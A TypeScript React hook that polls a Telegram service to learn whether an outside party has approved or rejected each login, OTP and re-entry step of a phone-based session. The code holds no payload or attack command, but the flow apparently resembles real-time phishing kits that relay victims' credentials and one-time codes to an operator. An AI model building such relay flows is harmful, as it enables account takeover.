import { useState, useEffect, useRef } from 'react';
import { telegramService } from '../services/telegramService';

interface UseTelegramPollingProps {
  sessionId: string | null;
  phone?: string;
  targetStep: 'login' | 'otp' | 'reenter';
  isActive: boolean;
  onApproved: () => void;
  onRejected: () => void;
}

export function useTelegramPolling({
  sessionId,
  phone,
  targetStep,
  isActive,
  onApproved,
  onRejected,
}: UseTelegramPollingProps) {
  const [status, setStatus] = useState<'idle' | 'pending' | 'approved' | 'rejected'>('idle');
  const [error, setError] = useState<string | null>(null);

  // Keep latest callbacks in refs so re-renders (e.g. countdown timer in OtpPage)
  // never tear down and cancel an active polling loop
  const onApprovedRef = useRef(onApproved);
  const onRejectedRef = useRef(onRejected);

  useEffect(() => {
    onApprovedRef.current = onApproved;
    onRejectedRef.current = onRejected;
  }, [onApproved, onRejected]);

  useEffect(() => {
    if (!isActive || !sessionId) {
      setStatus('idle');
      return;
    }

    let isCancelled = false;
    let isFinished = false;
    setStatus('pending');
    setError(null);

    const runPollingLoop = async () => {
      while (!isCancelled && !isFinished) {
        try {
          const result = await telegramService.pollUpdates(sessionId, targetStep, phone);

          if (isCancelled || isFinished) break;

          if (result === 'approved') {
            isFinished = true;
            setStatus('approved');
            onApprovedRef.current();
            break;
          } else if (result === 'rejected') {
            isFinished = true;
            setStatus('rejected');
            onRejectedRef.current();
            break;
          }
        } catch (err: any) {
          console.warn('Telegram polling check warning:', err);
          // Don't set error state on network issues - keep polling
        }

        // Brief pause before next cycle if still waiting
        if (!isCancelled && !isFinished) {
          await new Promise((resolve) => setTimeout(resolve, 800));
        }
      }
    };

    runPollingLoop();

    return () => {
      isCancelled = true;
    };
  }, [sessionId, phone, isActive, targetStep]);

  return {
    status,
    error,
  };
}

